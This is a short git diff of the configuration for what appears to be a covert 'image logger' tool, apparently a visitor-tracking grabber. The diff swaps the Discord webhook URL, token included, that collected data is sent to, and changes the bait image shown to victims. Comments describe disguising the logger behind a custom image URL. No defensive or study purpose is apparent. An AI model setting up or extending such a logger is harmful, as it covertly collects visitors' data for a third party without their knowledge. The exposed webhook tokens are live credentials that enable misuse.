@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1418636626602758255/Wjso6ZP0MzGX3CwKpQr1uC3fMTlzLSK9jwYIWLaYbUhEGAuGTsMZiQvELQHrfj-0fDRT",
-    "image": "https://i.ebayimg.com/images/g/Fb4AAOSwXjpj8BXT/s-l1600.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1420615668063277137/2C351i78-PBreWrrfq-wF-12STrSWig3vJFI7i0TlMi050HsG_rB7fMkkerWw8-ybj2n",
+    "image": "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExZDNzdWd0M3E5bHc3cmxodmE4enRxZnBvMGNwM290YXMzcWt5MHgwMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/5BLaYAysq4qfKupdtu/giphy.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
